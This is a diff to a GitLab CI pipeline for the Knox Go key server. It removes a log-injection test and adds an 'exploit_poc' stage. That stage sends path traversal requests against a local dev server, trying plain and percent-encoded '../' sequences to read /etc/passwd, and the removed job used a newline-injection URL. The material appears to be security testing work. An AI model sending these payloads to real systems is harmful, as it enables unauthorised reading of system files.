@@ -1,5 +1,6 @@
 stages:
   - test
+  - exploit
 
 variables:
   SERVER_CERT: server.crt
@@ -8,22 +9,38 @@ variables:
   CLIENT_CERT: client.crt
   CLIENT_KEY: client.key
 
-test_log_injection:
+test:
   stage: test
   image: golang:1.24
-  before_script:
-    - echo "$SERVER_CERT_CONTENT" > $SERVER_CERT || true
-    - echo "$SERVER_KEY_CONTENT" > $SERVER_KEY || true
-    - echo "$CA_CERT_CONTENT" > $CA_CERT || true
-    - echo "$CLIENT_CERT_CONTENT" > $CLIENT_CERT || true
-    - echo "$CLIENT_KEY_CONTENT" > $CLIENT_KEY || true
-
   script:
-    - go build -o knox-server ./cmd/dev_server
-    - ./knox-server --http :9000 > knox.log 2>&1 &
-    - sleep 3
-    - curl "http://localhost:9000/v1/keys/%0Ainjected:true%0A"
-    - if grep -q "injected:true" knox.log; then echo "Log injection succeeded"; else echo "Log injection failed" && exit 1; fi
+    - go mod download
+    - go test -v ./...
 
-  after_script:
-    - pkill knox-server || true
+exploit_poc:
+  stage: exploit
+  image: golang:1.24
+  script:
+    - echo "Starting Knox dev server..."
+    - go run ./cmd/dev_server & 
+    - SERVER_PID=$!
+    - sleep 5
+
+    - echo "Running malicious requests..."
+    - |
+      curl -v http://localhost:8080/normal/path || true
+      curl -v http://localhost:8080/../../../etc/passwd || true
+      curl -v http://localhost:8080/api/v1/keys/../../../../../etc/passwd || true
+      curl -v "http://localhost:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd" || true
+
+    - echo "Sleeping 2 seconds to ensure logs are flushed..."
+    - sleep 2
+
+    - echo "Killing server..."
+    - kill $SERVER_PID || true
+
+    - echo "Gather logs from Knox (adjust path as needed)..."
+    - cat knox.log || echo "No logs found"
+
+  artifacts:
+    paths:
+      - knox.log
